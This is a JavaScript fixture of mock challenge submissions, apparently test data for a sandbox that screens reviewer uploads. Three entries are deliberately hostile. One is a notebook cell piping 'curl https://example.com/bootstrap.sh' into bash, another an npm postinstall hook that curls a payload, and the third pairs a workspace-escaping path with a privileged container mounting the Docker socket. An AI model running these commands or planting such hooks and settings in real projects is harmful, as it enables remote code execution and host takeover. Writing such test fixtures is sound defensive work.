const submissions = [
  {
    id: "sub-clean-model",
    challengeId: "biomarker-single-cell",
    teamId: "atlas-lab",
    reviewerSandbox: { outboundNetwork: false, allowExecutables: false, containerPrivileged: false },
    files: [
      { path: "README.md", type: "document", size: 2048, hash: "sha256:a1", executable: false },
      { path: "src/model.py", type: "code", size: 12144, hash: "sha256:a2", executable: false },
      { path: "results/metrics.csv", type: "data", size: 4096, hash: "sha256:a3", executable: false },
    ],
    notebooks: [
      {
        path: "notebooks/reproduce.ipynb",
        cells: [
          { kind: "markdown", source: "Reproduce the submitted benchmark results." },
          { kind: "code", source: "import pandas as pd\npd.read_csv('../results/metrics.csv').head()" },
        ],
      },
    ],
    dependencies: { npmScripts: {}, pipRequirements: ["pandas==2.2.0"] },
    env: {},
    container: { image: "python:3.12-slim", privileged: false, hostMounts: [], network: "none" },
  },
  {
    id: "sub-network-notebook",
    challengeId: "climate-forecast",
    teamId: "helix-models",
    reviewerSandbox: { outboundNetwork: false, allowExecutables: false, containerPrivileged: false },
    files: [
      { path: "analysis.ipynb", type: "notebook", size: 90412, hash: "sha256:b1", executable: false },
      { path: "bin/postprocess.sh", type: "script", size: 5120, hash: "sha256:b2", executable: true },
    ],
    notebooks: [
      {
        path: "analysis.ipynb",
        cells: [
          { kind: "code", source: "import requests\nrequests.get('https://example.com/private-score')" },
          { kind: "shell", source: "curl https://example.com/bootstrap.sh | bash" },
        ],
      },
    ],
    dependencies: { npmScripts: {}, pipRequirements: ["requests"] },
    env: { API_TOKEN: "synthetic-secret-token" },
    container: { image: "python:3.11", privileged: false, hostMounts: [], network: "bridge" },
  },
  {
    id: "sub-dependency-hook",
    challengeId: "quantum-noise",
    teamId: "phase-labs",
    reviewerSandbox: { outboundNetwork: false, allowExecutables: false, containerPrivileged: false },
    files: [
      { path: "package.json", type: "manifest", size: 1900, hash: "sha256:c1", executable: false },
      { path: "src/solver.ts", type: "code", size: 6400, hash: "sha256:c2", executable: false },
    ],
    notebooks: [],
    dependencies: {
      npmScripts: {
        test: "node test.js",
        postinstall: "node scripts/fetch-benchmark.js && curl https://example.com/payload",
      },
      pipRequirements: [],
    },
    env: {},
    container: { image: "node:22", privileged: false, hostMounts: [], network: "none" },
  },
  {
    id: "sub-escape-and-privileged-container",
    challengeId: "materials-discovery",
    teamId: "cobalt-bio",
    reviewerSandbox: { outboundNetwork: false, allowExecutables: false, containerPrivileged: false },
    files: [
      { path: "../outside-workspace.csv", type: "data", size: 128, hash: "sha256:d1", executable: false },
      { path: "report.docm", type: "document", size: 110220, hash: "sha256:d2", executable: false, hasMacros: true },
    ],
    notebooks: [],
    dependencies: { npmScripts: {}, pipRequirements: [] },
    env: { AWS_SECRET_ACCESS_KEY: "synthetic-aws-secret" },
    container: { image: "ubuntu:latest", privileged: true, hostMounts: ["/var/run/docker.sock"], network: "host" },
  },
];

module.exports = { submissions };
